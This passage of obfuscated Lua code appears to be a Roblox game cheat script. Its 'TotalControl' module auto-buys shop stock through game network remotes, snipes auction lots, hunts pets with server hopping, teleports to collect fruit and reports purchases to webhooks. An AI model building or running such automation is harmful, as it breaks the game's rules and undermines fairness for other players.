					G = 1
				end
				V += math.max(math.floor(G), 0)
			end
		end
		return V
	end,
	ResolveGearShopNamesTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		local G = {}
		local V = ((tonumber(Z.Money.GetSheckles()) or 0)) > 900000000
		for y, j in pairs(g.AllGearShopData or {}) do
			local i = type(j) == "table" and tonumber(j.price) or 0
			if i > 0 and ((Z.TotalControl.IsUsefulGearTotalControl(y, j) or V)) then
				table.insert(G, y)
			end
		end
		table.sort(G, function(G, V)
			local y = g.AllGearShopData[G]
			local j = g.AllGearShopData[V]
			local i = Z.TotalControl.GetGearShopPriorityTotalControl(G, y)
			local c = Z.TotalControl.GetGearShopPriorityTotalControl(V, j)
			if i ~= c then
				return i < c
			end
			local J = g.RarityRank[tostring(type(y) == "table" and y.rarity or "")] or 0
			local T = g.RarityRank[tostring(type(j) == "table" and j.rarity or "")] or 0
			if J ~= T then
				return J > T
			end
			local d = type(y) == "table" and tonumber(y.price) or 0
			local u = type(j) == "table" and tonumber(j.price) or 0
			if d ~= u then
				return d > u
			end
			return tostring(G) < tostring(V)
		end)
		return G
	end;
	ResolveGearShopSelectionTotalControl = function(G, V)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = tostring(G or "")
		V = type(V) == "table" and V or g.AllGearShopData[G]
		if G == "" or type(V) ~= "table" or ((tonumber(V.price) or 0)) <= 0 then
			return false
		end
		if Z.TotalControl.IsUsefulGearTotalControl(G, V) then
			return true
		end
		return ((tonumber(Z.Money.GetSheckles()) or 0)) > 900000000
	end;
	ResolveCrateShopEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end;
	IsUsefulCrateTotalControl = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or g.AllCrateShopData[G]
		if G == "" or type(V) ~= "table" then
			return false
		end
		return ((g.RarityRank[tostring(V.rarity or "")] or 0)) >= ((g.RarityRank.Legendary or 5))
	end,
	ResolveCrateShopNamesTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return {}
	end,
	ResolveCrateShopSelectionTotalControl = function(G, V)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end,
	ResolveAuctioneerEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end,
	IsGoodAuctionLotTotalControl = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.category or "")
		local y = Y.Auctioneer and (Y.Auctioneer.GetDisplayNameAuctioneer and Y.Auctioneer.GetDisplayNameAuctioneer(G)) or tostring(G.item or "")
		local Z = string.lower(tostring(G.item or "") .. (" " .. (tostring(y or "") .. (" " .. V))))
		local j = g.RarityRank[tostring(Y.Auctioneer.ResolveRarityAuctioneer(G) or "")] or 0
		if V == "Seeds" or Z:find("seed", 1, true) ~= nil then
			return j >= ((g.RarityRank.Legendary or 5))
		end
		if V == "Pets" or Z:find("pet", 1, true) ~= nil then
			return j >= ((g.RarityRank.Super or 7)) or Z:find("big", 1, true) ~= nil or Z:find("huge", 1, true) ~= nil or Z:find("rainbow", 1, true) ~= nil
		end
		local i = Z:find("watering can", 1, true) ~= nil or Z:find("wateringcan", 1, true) ~= nil or Z:find(" can", 1, true) ~= nil
		local c = Z:find("sprinkler", 1, true) ~= nil
		local J = i or c or Z:find("trowel", 1, true) ~= nil or Z:find("power hose", 1, true) ~= nil
		if J then
			return j >= ((g.RarityRank.Legendary or 5)) or Z:find("super", 1, true) ~= nil
		end
		return j >= ((g.RarityRank.Super or 7))
	end;
	ResolveAuctioneerPassesSelectedItemTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return Z.TotalControl.IsGoodAuctionLotTotalControl(G)
	end,
	ResolveAuctioneerPassesPriceTotalControl = function(G, V, y)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		if not Z.TotalControl.IsGoodAuctionLotTotalControl(G) then
			return false, "not useful"
		end
		local j = 90
		if ((tonumber(y) or 0)) >= j then
			return true
		end
		return false, string.format("waiting %d%%", j)
	end;
	ResolveAuctioneerAffordableTotalControl = function(G, V, y)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		V = math.max(tonumber(V) or 0, 0)
		y = math.max(tonumber(y) or 0, 0)
		if V <= 0 or y < V then
			return false
		end
		local j = g.RarityRank[tostring(Y.Auctioneer.ResolveRarityAuctioneer(G) or "")] or 0
		if j >= ((g.RarityRank.Super or 7)) then
			return true
		end
		return V <= y * .65
	end,
	ResolveAuctioneerPreviewOnlyTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end,
	ResolveAuctionCandidateScoreTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() or type(G) ~= "table" then
			return nil
		end
		local V = g.RarityRank[tostring(Y.Auctioneer.ResolveRarityAuctioneer(G.lot) or "")] or 0
		return (V * 1000 + ((tonumber(G.discountPercent) or 0)) * 10) - ((tonumber(G.currentPrice) or 0)) / 1000000
	end,
	ResolvePetFinderEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end;
	ResolvePetFinderUseWalkTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolvePetFinderAutoHopTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return h.pet_finder_auto_hop == true
	end;
	ResolvePetFinderRuleTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() or g.GetCheckIfPro() ~= true then
			return nil
		end
		G = tostring(G or "")
		if G == "" or type(y.PetData) ~= "table" or type(y.PetData[G]) ~= "table" then
			return nil
		end
		return {
			enabled = true,
			target = 6,
			sizes = {};
			variants = {};
			total_control = true
		}
	end,
	PassesPetFinderAvoidTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or "")
		if Z.TotalControl.NormalPetBuyAvoidTotalControl[V] ~= true then
			return true
		end
		local y = tostring(G.size or "Normal")
		local j = tostring(G.variant or "Normal")
		return y == "Big" or y == "Huge" or j == "Rainbow"
	end;
	IsUnlimitedPetFinderTargetTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() or type(G) ~= "table" then
			return nil
		end
		local V = g.RarityRank[tostring(G.rarity or "")] or 0
		local y = g.RarityRank.Super or 7
		return tostring(G.size or "Normal") == "Big" or tostring(G.size or "Normal") == "Huge" or tostring(G.variant or "Normal") == "Rainbow" or V >= y
	end;
	ResolvePetFinderReachedTargetTotalControl = function(G, V)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		if Z.TotalControl.IsUnlimitedPetFinderTargetTotalControl(G) == true then
			return false
		end
		if type(G) ~= "table" or type(V) ~= "table" then
			return true
		end
		local y = {
			enabled = true;
			target = V.target or 6;
			sizes = {
				Normal = true
			};
			variants = {
				Normal = true
			}
		}
		return Z.PetFinderPremium.CountOwnedRaw(G.name, y) >= y.target
	end;
	ResolvePetFinderExpectedCountTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return Z.TotalControl.IsUnlimitedPetFinderTargetTotalControl(G) ~= true
	end;
	ResolvePetCandidateScoreTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() or type(G) ~= "table" then
			return nil
		end
		local V = (({
			Huge = 300;
			Big = 200;
			Normal = 0
		}))[tostring(G.size or "Normal")] or 0
		local y = tostring(G.variant or "Normal") == "Rainbow" and 100 or 0
		local j = ((g.RarityRank[tostring(G.rarity or "")] or 0)) * 10
		return (V + y) + j
	end,
	AddPetPurchaseLogTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() or type(G) ~= "table" then
			return nil
		end
		local V = X.cache.pet_purchase_log
		if type(V) ~= "table" then
			V = {}
			X.cache.pet_purchase_log = V
		end
		table.insert(V, 1, {
			pet = G.name;
			display_name = G.displayName;
			size = G.size,
			variant = G.variant,
			rarity = G.rarity,
			price = G.price;
			purchased_at = os.time()
		})
		while # V > 10 do
			table.remove(V)
		end
		return true
	end;
	ResolvePetTriggersEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolvePetFarmReturnEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolvePetFarmReturnTimerTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return 20
	end;
	ResolveHighModeEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end;
	BuildIdlePetRuleTotalControl = function(G, V)
		local y = Z.PetTriggersV2
		if type(y) ~= "table" or type(y.GetInventoryPetsPetTriggersV2) ~= "function" or type(y.GetMaxSlotsPetTriggersV2) ~= "function" then
			return nil
		end
		local j = y.GetInventoryPetsPetTriggersV2()
		local i = y.GetMaxSlotsPetTriggersV2()
		if type(j) ~= "table" or i <= 0 then
			return nil
		end
		local c = {}
		local J = {}
		local function T(G)
			G = tostring(G or "")
			if G == "" or # J >= i then
				return false
			end
			for V, y in ipairs(j) do
				local Z = tostring(y.id or y.key or "")
				if Z == "" or c[Z] or tostring(y.name or "") ~= G then
					continue
				end
				c[Z] = true
				table.insert(J, {
					pet = G,
					amount = 1,
					size = tostring(y.size or "Normal"),
					variant = tostring(y.variant or "Normal")
				})
				return true
			end
			return false
		end
		if ((tonumber(G) or 0)) <= 3 then
			for G, V in ipairs(Z.TotalControl.IdleSeedPetPriorityTotalControl) do
				if T(V) then
					break
				end
			end
		end
		V = math.max(math.floor(tonumber(V) or 0), 0)
		local d = Z.TotalControl.IdleCropPetPrioritySmallTotalControl
		local u = "total_control_pet_idle_small"
		if V >= Z.TotalControl.LargeGardenPlantThresholdTotalControl then
			d = Z.TotalControl.IdleCropPetPriorityLargeTotalControl
			u = "total_control_pet_idle_large"
		end
		for G, V in ipairs(d) do
			if T(V) then
				break
			end
		end
		for G, V in ipairs(Z.TotalControl.IdleUtilityPetPriorityTotalControl) do
			T(V)
		end
		for G, V in ipairs(d) do
			while # J < i and T(V) do
			end
		end
		if # J == 0 then
			return nil
		end
		return {
			id = u,
			enabled = true;
			triggerType = "Default",
			loadoutMode = "Manual";
			pets = J,
			total_control = true
		}
	end;
	IsMutationSeedWeatherActiveTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return false
		end
		local function G(G)
			local V = Z.WeatherTriggers and (Z.WeatherTriggers.NormaliseWeatherTriggers and Z.WeatherTriggers.NormaliseWeatherTriggers(G)) or ((tostring(G or "")):lower()):gsub("%s+", "")
			return V:find("moon", 1, true) ~= nil and ((V:find("mega", 1, true) ~= nil or V:find("rainbow", 1, true) ~= nil or V:find("gold", 1, true) ~= nil))
		end
		if G(y.Workspace:GetAttribute("ActiveWeather")) or G(y.Workspace:GetAttribute("ActivePhase")) then
			return true
		end
		local V = Z.WeatherTriggers and (Z.WeatherTriggers.GetWeatherValuesWeatherTriggers and Z.WeatherTriggers.GetWeatherValuesWeatherTriggers())
		if V and type(V.GetAttributes) == "function" then
			for V, y in pairs(V:GetAttributes()) do
				if y == true and G((tostring(V or "")):gsub("_Playing$", "")) then
					return true
				end
			end
		end
		return false
	end;
	ResolvePetTriggersRuleTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		local G = type(g.PetTriggersV2LastPetBuy) == "table" and g.PetTriggersV2LastPetBuy or nil
		if type(G) == "table" and (G.active == true and os.clock() < ((tonumber(G.expiresAt) or 0))) then
			return {
				id = "total_control_pet_speed",
				enabled = true,
				triggerType = "Default",
				loadoutMode = "Speed",
				pets = {};
				total_control = true
			}
		end
		if Z.TotalControl.IsMutationSeedWeatherActiveTotalControl() then
			return {
				id = "total_control_pet_mutation_seed_speed";
				enabled = true,
				triggerType = "Default";
				loadoutMode = "Speed";
				pets = {};
				total_control = true
			}
		end
		local V = Z.DataReplica.GetData("Inventory")
		local y = 0
		local j = type(V) == "table" and V.Seeds or nil
		if type(j) == "table" then
			for G, V in pairs(j) do
				y += math.max(math.floor(tonumber(V) or 0), 0)
			end
		end
		local i = Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit()
		local c = Z.TotalControl.BuildIdlePetRuleTotalControl(y, i)
		if c then
			return c
		end
		local function J(G)
			if not Z.PetTriggersV2 or type(Z.PetTriggersV2.GetInventoryPetsPetTriggersV2) ~= "function" then
				return false
			end
			for V, y in ipairs(Z.PetTriggersV2.GetInventoryPetsPetTriggersV2()) do
				if Z.PetTriggersV2.PetMatchesCategoryPetTriggersV2(y, G) then
					return true
				end
			end
			return false
		end
		local T = y <= 3 and (J("Seed") and "Seed") or "Growth"
		if not J(T) then
			T = J("Speed") and "Speed" or "Growth"
		end
		return {
			id = "total_control_pet_" .. string.lower(T);
			enabled = true,
			triggerType = "Default",
			loadoutMode = T,
			pets = {};
			total_control = true
		}
	end;
	ResolveNormalSeedPlacerEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end;
	ResolveSeedPlacerModeTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return W.UseDefault
	end,
	ResolveSeedPlaceDelayTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return .3
	end,
	ResolveSmartSeedingEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolveMutationSeedsAllowedTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return h.smart_seed_progression_mutation_seeds_enabled == true
	end;
	ResolveFruitCollectorEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolveFruitCollectFastModeTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end;
	ResolveFruitCollectNoLimitsTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end;
	ResolveFruitCollectPreventDestroyPlantsTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end,
	ResolveFruitCollectTeleportTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolveFruitCollectSortModeTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return "Highest Price > Lowest"
	end,
	GetFruitWaitKeyTotalControl = function(G)
		if type(G) ~= "table" then
			return ""
		end
		local V = tostring(G.plantId or "")
		local y = tostring(G.fruitId or G.id or "")
		if V ~= "" or y ~= "" then
			return V .. (":" .. y)
		end
		return tostring(G.name or G.n or "") .. (":" .. tostring(G.w or ""))
	end,
	ShouldWaitForMutationFruitTotalControl = function(G)
		if Z.AdvancedIncomeFarm and (type(Z.AdvancedIncomeFarm.IsEnabledAdvancedIncomeFarm) == "function" and Z.AdvancedIncomeFarm.IsEnabledAdvancedIncomeFarm()) then
			return Z.AdvancedIncomeFarm.ShouldHoldFruitAdvancedIncomeFarm(G)
		end
		if not Z.TotalControl.IsEnabledTotalControl() or type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or G.n or "")
		if V == "" then
			return false
		end
		local y = tonumber(G.w) or 0
		if y < 10 then
			return false
		end
		local j = g.RarityRank[tostring(G.r or g.SeedRarity[V] or "")] or 0
		local i = j >= ((g.RarityRank.Legendary or 5)) or V == "Mushroom"
		if not i then
			return false
		end
		local c, J, T = Z.FruitFilters.GetMutationLookup(G)
		return tostring(T or "") == ""
	end,
	PassesFruitCollectTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or G.n or "")
		if V == "" or G.has_weight == false or ((tonumber(G.w) or 0)) <= 0 then
			return false
		end
		if Z.TotalControl.ShouldWaitForMutationFruitTotalControl(G) then
			Z.TotalControl.SetStatusTotalControl("Waiting for mutation", "#FFCC66")
			return false
		end
		return true
	end,
	ResolveSellAllEnabledTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return ((tonumber(G) or 0)) > 0
	end,
	ResolveTurboSellEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end,
	ResolveDailyDealEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolveSellWhenBackpackFullTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end,
	ResolveSprinklerPlacerEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return g.GetCheckIfPro() == true
	end;
	ResolveSprinklerWeatherAllowedTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolveSprinklerPlaceModeTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return W.UseDefault
	end;
	ResolveSprinklerSelectionTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		local G = {}
		for V, y in ipairs(Z.SprinklerPlacer.GetNames()) do
			if Z.TotalControl.IsLegendaryOrLowerSprinklerTotalControl(y, g.AllGearShopData[y]) then
				G[y] = true
			end
		end
		return G
	end;
	ResolveSprinklerTargetAmountTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return 1
	end,
	ResolveSprinklerReplaceNearExpiryTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolveSprinklerTeleportTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return false
	end,
	ResolveWaterPlantsEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolveWaterPlantsWeatherAllowedTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolveWaterPlantsModeTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return W.UseDefault
	end;
	ResolveWaterPlantsSelectedCansTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return {
			["Common Watering Can"] = true
		}
	end,
	ResolveWaterPlantsWaitEffectTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolveGardenExpandEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	CanBuyGardenExpansionTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = math.max(math.floor(tonumber(G) or 0), 0)
		if G <= Z.TotalControl.FreeGardenExpansionsTotalControl then
			return true
		end
		local V = Z.GardenSeedLimit.GetCurrentCountGardenSeedLimit()
		local y = Z.GardenSeedLimit.GetCurrentLimitGardenSeedLimit()
		return V >= y, V, y
	end;
	ResolveGardenExpandTargetSlotTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return math.max(math.floor(tonumber(G) or 1), 1)
	end,
	ResolvePetInventoryExpandEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end,
	ResolvePetInventoryTargetUpgradeTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return math.max(math.floor(tonumber(G) or 0), 0)
	end;
	CanBuyPetInventoryUpgradeTotalControl = function(G, V)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		G = math.max(math.floor(tonumber(G) or 0), 0)
		if G <= Z.TotalControl.FreePetInventoryUpgradesTotalControl then
			return true, Z.TotalControl.PetInventoryMinimumShecklesTotalControl
		end
		V = math.max(tonumber(V) or 0, 0)
		return V > Z.TotalControl.PetInventoryMinimumShecklesTotalControl, Z.TotalControl.PetInventoryMinimumShecklesTotalControl
	end,
	ResolvePetInventorySpendableShecklesTotalControl = function(G)
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return math.max(tonumber(G) or 0, 0), 0
	end,
	ResolveTrowelEnabledTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		return true
	end;
	ResolveTrowelTargetPositionTotalControl = function()
		if not Z.TotalControl.IsEnabledTotalControl() then
			return nil
		end
		local G, V = Z.Trowel.GetDefaultPlacementPositionTrowel(W.UseDefault)
		if typeof(G) ~= "Vector3" then
			return false, tostring(V or "Farm position") .. " not found"
		end
		return G
	end
}
Y.ShopTrigger = {
	GetValuesShopTrigger = function()
		if Z.WeatherTriggers and type(Z.WeatherTriggers.GetOptionsWeatherTriggers) == "function" then
			return Z.WeatherTriggers.GetOptionsWeatherTriggers()
		end
		return {
			"Any Time"
		}
	end;
	NormaliseShopTrigger = function(G)
		return Z.WeatherTriggers and Z.WeatherTriggers.NormaliseWeatherTriggers(G) or ((tostring(G or "")):lower()):gsub("%s+", "")
	end,
	NamesMatchShopTrigger = function(G, V)
		return Y.ShopTrigger.NormaliseShopTrigger(G) == Y.ShopTrigger.NormaliseShopTrigger(V)
	end,
	IsActiveShopTrigger = function(G)
		G = tostring(G or "")
		local V = Z.TotalControl.ResolveShopTriggerActiveTotalControl(G)
		if V ~= nil then
			return V == true
		end
		if G == "" then
			return true
		end
		if h[G .. "_trigger_enabled"] ~= true then
			return true
		end
		local y = tostring(h[G .. "_trigger_name"] or "Any Time")
		if y == "" or y == "Any Time" then
			return true
		end
		if Z.WeatherTriggers and type(Z.WeatherTriggers.IsTriggerActiveWeatherTriggers) == "function" then
			return Z.WeatherTriggers.IsTriggerActiveWeatherTriggers(y) == true
		end
		return false
	end
}
Y.ShopBuyer = {
	IsSelectedShopBuyer = function(G, V)
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] == true then
			return true
		end
		for G, y in pairs(G) do
			if tostring(y or "") == V then
				return true
			end
		end
		return false
	end;
	GetSpendableShecklesShopBuyer = function(G, V)
		V = tonumber(V) or 0
		G = tostring(G or "")
		local y = Z.TotalControl.ResolveSpendableShecklesTotalControl(G, V)
		if y ~= nil then
			return y
		end
		if G == "" or h[G .. "_min_sheckles_enabled"] ~= true then
			return V
		end
		local j = tonumber(h[G .. "_min_sheckles"]) or 0
		if j <= 0 then
			return V
		end
		return math.max(0, V - j)
	end,
	GetAllSelectionShopBuyer = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			local Z = ""
			if type(G) == "string" then
				Z = G
			elseif type(y) == "table" then
				Z = tostring(y.name or y.ItemName or y.SeedName or "")
			elseif type(y) == "string" then
				Z = y
			end
			if Z ~= "" then
				V[Z] = true
			end
		end
		return V
	end
}
Y.SeedShop = {
	GetCurrentStockSeedStock = function(G)
		if not y.SeedShop or not y.SeedShop.Items then
			return 0
		end
		local V = y.SeedShop.Items:FindFirstChild(G)
		if V then
			return tonumber(V.Value) or 0
		end
		return 0
	end;
	BuySeed = function(G)
		local V = Z.TotalControl.ResolveSeedShopSelectionTotalControl(G)
		if V ~= nil then
			if V ~= true then
				return false
			end
		elseif not Y.ShopBuyer.IsSelectedShopBuyer(h.seed_shop_buy_selected, G) then
			return false
		end
		local j = y.Networking and (y.Networking.SeedShop and y.Networking.SeedShop.PurchaseSeed)
		if not j or type(j.Fire) ~= "function" then
			return false
		end
		j:Fire(G)
		return true
	end,
	SeedBuyerLoop = function()
		local G = Z.TotalControl.ResolveSeedShopEnabledTotalControl()
		if G ~= nil then
			if G ~= true then
				return
			end
		elseif not h.enabled_seed_shop then
			return
		end
		if not Y.ShopTrigger.IsActiveShopTrigger("seed_shop") then
			return
		end
		local V = Z.DataReplica.GetData("PurchasedThisRestock")
		if not V then
			return
		end
		local y = tonumber(Z.Money.GetSheckles()) or 0
		local j = V.Seeds or {}
		local i = Z.TotalControl.ResolveSeedShopNamesTotalControl()
		local function c(G)
			local V = Z.TotalControl.ResolveSeedShopSelectionTotalControl(G)
			if V ~= nil then
				if V ~= true then
					return
				end
			elseif not Y.ShopBuyer.IsSelectedShopBuyer(h.seed_shop_buy_selected, G) then
				return
			end
			local i = Z.SeedData.GetSeedDataX(G)
			if not i then
				return
			end
			local c = tonumber(i.price) or 0
			if c <= 0 then
				return
			end
			local J = Y.SeedShop.GetCurrentStockSeedStock(G)
			local T = tonumber(j[G]) or 0
			local d = math.max(0, J - T)
			if d <= 0 then
				return
			end
			local u = Y.ShopBuyer.GetSpendableShecklesShopBuyer("seed_shop", y)
			local q = math.min(d, math.floor(u / c))
			local g = Z.TotalControl.ResolveSeedShopBuyLimitTotalControl(G)
			if g ~= nil then
				local V = Z.Seeder.GetInventorySeedCountSeedPlacer(G)
				q = math.min(q, math.max(g - V, 0))
			end
			if q <= 0 then
				return
			end
			if Z.TotalControl.IsEnabledTotalControl() then
				Z.TotalControl.SetStatusTotalControl("Buying seed stock", "#66CCFF")
			end
			for V = 1, q, 1 do
				if Y.ShopBuyer.GetSpendableShecklesShopBuyer("seed_shop", tonumber(Z.Money.GetSheckles()) or 0) < c then
					break
				end
				local j = Y.SeedShop.BuySeed(G)
				task.wait(.1)
				y = tonumber(Z.Money.GetSheckles()) or 0
				if j and Z.TotalControl.IsEnabledTotalControl() then
					Z.Webhooks.QueueTotalControlShopPurchase("Seed", G, i.rarity, c, y)
				end
			end
		end
		if i ~= nil then
			for G, V in ipairs(i) do
				c(V)
			end
		else
			for G in pairs(g.SeedShopDataList) do
				c(G)
			end
		end
	end
}
Y.GearShop = {
	BuyGear = function(G)
		local V = Z.TotalControl.ResolveGearShopSelectionTotalControl(G)
		if V ~= nil then
			if V ~= true then
				return false
			end
		elseif not Y.ShopBuyer.IsSelectedShopBuyer(h.gear_shop_buy_selected, G) then
			return false
		end
		local j = y.Networking and (y.Networking.GearShop and y.Networking.GearShop.PurchaseGear)
		if not j or type(j.Fire) ~= "function" then
			return false
		end
		j:Fire(G)
		return true
	end;
	GearShopLoop = function()
		local G = Z.TotalControl.ResolveGearShopEnabledTotalControl()
		if G ~= nil then
			if G ~= true then
				return
			end
		elseif not h.enabled_gear_shop then
			return
		end
		if not Y.ShopTrigger.IsActiveShopTrigger("gear_shop") then
			return
		end
		local V = Z.DataReplica.GetData("PurchasedThisRestock")
		if not V then
			return
		end
		local y = tonumber(Z.Money.GetSheckles()) or 0
		local j = V.Gear or V.Gears or {}
		local i = Z.TotalControl.ResolveGearShopNamesTotalControl()
		local c = {}
		local function J(G, V)
			local i = Z.TotalControl.ResolveGearShopSelectionTotalControl(G, V)
			if i ~= nil then
				if i ~= true then
					return
				end
			elseif not Y.ShopBuyer.IsSelectedShopBuyer(h.gear_shop_buy_selected, G) then
				return
			end
			V = type(V) == "table" and V or g.AllGearShopData[G]
			if type(V) ~= "table" then
				return
			end
			local J = tonumber(V.price) or 0
			if J <= 0 then
				return
			end
			local T = tonumber(Z.GearData.GetGearStockCurrent(G)) or 0
			local d = tonumber(j[G]) or 0
			local u = math.max(0, T - d)
			if u <= 0 then
				return
			end
			local q = i ~= nil and Z.TotalControl.IsUsefulGearTotalControl(G, V)
			local E = Y.ShopBuyer.GetSpendableShecklesShopBuyer("gear_shop", y)
			local a = math.min(u, math.floor(E / J))
			if i ~= nil and not q then
				local V = c[G]
				if V == nil then
					V = Z.TotalControl.GetOwnedGearCountTotalControl(G)
					c[G] = V
				end
				local j = math.max(0, 9 - V)
				local i = math.max(0, y - 900000000)
				a = math.min(u, j, math.floor(i / J))
			end
			if a <= 0 then
				return
			end
			if Z.TotalControl.IsEnabledTotalControl() then
				Z.TotalControl.SetStatusTotalControl("Buying useful gear", "#66CCFF")
			end
			for j = 1, a, 1 do
				local T = tonumber(Z.Money.GetSheckles()) or 0
				local d = Y.ShopBuyer.GetSpendableShecklesShopBuyer("gear_shop", T)
				if i ~= nil and not q then
					d = math.max(0, T - 900000000)
				end
				if d < J then
					break
				end
				local u = Y.GearShop.BuyGear(G)
				task.wait(.1)
				y = tonumber(Z.Money.GetSheckles()) or 0
				if u and (i ~= nil and not q) then
					c[G] = ((c[G] or 0)) + 1
				end
				if u and Z.TotalControl.IsEnabledTotalControl() then
					Z.Webhooks.QueueTotalControlShopPurchase("Gear", G, V.rarity, J, y)
				end
			end
		end
		if i ~= nil then
			for G, V in ipairs(i) do
				J(V, g.AllGearShopData[V])
			end
		else
			for G, V in pairs(g.AllGearShopData) do
				J(G, V)
			end
		end
	end
}
Y.CrateShop = {
	BuyCrate = function(G)
		local V = Z.TotalControl.ResolveCrateShopSelectionTotalControl(G, g.AllCrateShopData[G])
		if V ~= nil then
			if V ~= true then
				return false
			end
		elseif not Y.ShopBuyer.IsSelectedShopBuyer(h.crate_shop_buy_selected, G) then
			return false
		end
		local j = y.Networking and (y.Networking.CrateShop and y.Networking.CrateShop.PurchaseCrate)
		if not j or type(j.Fire) ~= "function" then
			return false
		end
		j:Fire(G)
		return true
	end;
	CrateShopLoop = function()
		local G = Z.TotalControl.ResolveCrateShopEnabledTotalControl()
		if G ~= nil then
			if G ~= true then
				return
			end
		elseif not h.enabled_crate_shop then
			return
		end
		if not Y.ShopTrigger.IsActiveShopTrigger("crate_shop") then
			return
		end
